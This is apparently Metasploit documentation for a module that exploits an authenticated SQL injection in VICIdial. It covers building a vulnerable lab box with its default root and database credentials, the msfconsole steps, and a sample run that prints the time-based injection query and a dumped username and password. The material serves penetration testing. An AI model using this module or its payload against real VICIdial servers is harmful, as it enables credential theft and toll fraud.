## Vulnerable Application

This module exploits a single authenticated SQL Injection vulnerability in VICIdial, affecting version 2.14-917a.

VICIdial does not encrypt passwords by default.

VICIBox/VICIdial includes an auto-update mechanism, so be aware when creating vulnerable boxes.

### Install

#### Version 11.0.1 Setup

1. **Download the ISO**:
   [ViciBox_v11.x86_64-11.0.1-md.iso](http://download.vicidial.com/iso/vicibox/server/ViciBox_v11.x86_64-11.0.1-md.iso)

2. **Create a VM**:
   - Connect to the shell using the default credentials:
     `root:vicidial` (Note: The keyboard layout is QWERTY by default).

3. **Run the setup and reboot the VM**:
   - After rebooting, **do not** run the command `/usr/local/bin/vicibox-install` until after the next step.

4. **Vulnerable Revision Setup**:
   - Run the following command to install a vulnerable version of VICIdial:
```
svn checkout -r 3830 svn://svn.eflo.net:3690/agc_2-X/trunk /usr/src/astguiclient/trunk
```
   - Revision 3830 is vulnerable to both SQL Injection and RCE.
   - Note: The CVEs have been patched starting from revision 3848.

5. **Legacy Installation**:
   - Run the installation in legacy mode:
```
vicibox-install --legacy
```

6. **Installer Output Example**:
```
vicibox11:~ # vicibox-install --legacy

ViciBox Installer

Legacy mode activated
Use of uninitialized value $string in substitution (s///) at /usr/local/bin/vicibox-install line 137.
Use of uninitialized value $string in substitution (s///) at /usr/local/bin/vicibox-install line 138.
Use of uninitialized value $string in substitution (s///) at /usr/local/bin/vicibox-install line 137.
Use of uninitialized value $string in substitution (s///) at /usr/local/bin/vicibox-install line 138.

The installer will ask questions based upon the role that this server is
to provide for the ViciBox Call Center Suite. You should have the database
and optionally archive servers setup prior to installing any other servers.
The installer will not run without there being a configured database! If this
server is to be the database then it must be installed before the archive server.
Verify that all servers are connected to the same network and have connectivity
to each other before continuing. This installer will be destructive to the server if it is run.

Do you want to continue with the ViciBox install? [y/N] : y

Do you want to enable expert installation? [y/N] : 

The Internal IP address found was 192.168.1.4.
Do you want to use this IP address for ViciDial? [Y/n] : y

Will this server be used as the Database? [y/N] : y
Do you want to use the default ViciDial DB settings? [Y/n] : y

Will this server be used as a Web server? [y/N] : y

Will this server be used as a Telephony server? [y/N] : y

Will this server be used as an Archive server? [y/N] : y
Archive server IP (192.168.1.4) : 
Archive FTP User (cronarchive) : 
Archive FTP Password (archive1234) : 
Archive FTP Port (21) : 
Archive FTP Directory () : 
Archive URL (http://192.168.1.4/archive/) : 
Use of uninitialized value $localsvn in concatenation (.) or string at /usr/local/bin/vicibox-install line 1513, <STDIN> line 14.

The local SVN is build 240419-1817 version 2.14-916a from SVN 
Do you want to use the ViciDial version listed above? [Y/n] : y

Do you want to disable the built-in firewall? [y/N] : y


---  ViciBox Install Summary  ---

Expert   : No
Legacy   : Yes
Database : Yes
Web      : Yes
Telephony: Yes
First Srv: Yes
Have Arch: No
Archive  : Yes
Firewall : Disabled

---  Configuration Information  ---
-  Database  -
Use of uninitialized value $DBsvnrev in concatenation (.) or string at /usr/local/bin/vicibox-install line 1609, <STDIN> line 16.
SVN Rev  : 
IP Addr  : 192.168.1.4
Name     : asterisk
User     : cron
Password : 1234
Cust User: custom
Cust Pass: custom1234
Port     : 3306


Please verify the above information before continuing!
Do you want to continue the installation? [y/N] : y


Beginning installation, expect lots of output...

Disabling firewall...
Removed /etc/systemd/system/multi-user.target.wants/firewalld.service.
Removed /etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.
Use of uninitialized value $DBsvnrev in numeric ne (!=) at /usr/local/bin/vicibox-install line 208, <STDIN> line 17.
Use of uninitialized value $localsvn in numeric ne (!=) at /usr/local/bin/vicibox-install line 208, <STDIN> line 17.
Use of uninitialized value $DBsvnrev in concatenation (.) or string at /usr/local/bin/vicibox-install line 218, <STDIN> line 17.
Local SVN revision matches DB revision: 
Doing general DataBase requirements...
Doing Master-specific MySQL setup...
Configuring Web Server...
Created symlink /etc/systemd/system/httpd.service → /usr/lib/systemd/system/apache2.service.
Created symlink /etc/systemd/system/apache.service → /usr/lib/systemd/system/apache2.service.
Created symlink /etc/systemd/system/multi-user.target.wants/apache2.service → /usr/lib/systemd/system/apache2.service.
Configuring Telephony Server...
Configuring Archive Server...
Nouveau mot de passe : MOT DE PASSE INCORRECT : trop simple/systématique
Retapez le nouveau mot de passe : passwd: password updated successfully
Created symlink /etc/systemd/system/multi-user.target.wants/vsftpd.service → /usr/lib/systemd/system/vsftpd.service.
Loading GMT and Phone Codes...

Seeding the audio store, this may take a while...

PLEASE use secure passwords inside vicidial. It prevents hackers
and other undesirables from compromising your system and costing
you thousands in toll fraud and long distance. A secure password
Contains at least one capital letter and one number. A good example
of a secure password would be NrWZDqL1Rg37uuC.

Don't feed the black market, secure your systems properly!

System should be installed. Please type 'reboot' to cleanly load everything.

```

7. **Post-Installation**:
   - After installation, **reboot** the system.
   - Access the web panel by navigating to the administration page and completing the initial setup.

## Verification Steps

1. Start msfconsole
1. Do: `use auxiliary/scanner/http/vicidial_sql_enum_users_pass`
1. Do: `set RHOSTS <ip>`
1. Do: `set RPORT <port>`
1. Do: `set TARGETURI <path>`
1. Do: `set COUNT <number>`
1. Do: `set SqliDelay <number>`
1. Do: `run`
1. The module will exploit the SQL injection and return the extracted usernames and passwords

## Options

### COUNT

Number of records to dump. Defaults to 1.

### SqliDelay

Delay in seconds for SQL Injection sleep. Defaults to 1.

## Scenarios

### ViciBox 11.0.1

```
msf6 auxiliary(scanner/http/vicidial_sql_enum_users_pass) > run http://192.168.1.4
[*] Running module against 192.168.1.4

[*] Checking if target is vulnerable...
[+] Target is vulnerable to SQL injection.
[*] {SQLi} Executing (select group_concat(HCx) from (select cast(concat_ws(';',ifnull(User,''),ifnull(Pass,'')) as binary) HCx from vicidial_users limit 1) em)
[*] {SQLi} Encoded to (select group_concat(HCx) from (select cast(concat_ws(0x3b,ifnull(User,repeat(0x88,0)),ifnull(Pass,repeat(0x3f,0))) as binary) HCx from vicidial_users limit 1) em)
[*] {SQLi} Time-based injection: expecting output of length 13
[+] Dumped table contents:
vicidial_users
==============

    User  Pass
    ----  ----
    6666  password

[*] Auxiliary module execution completed
```
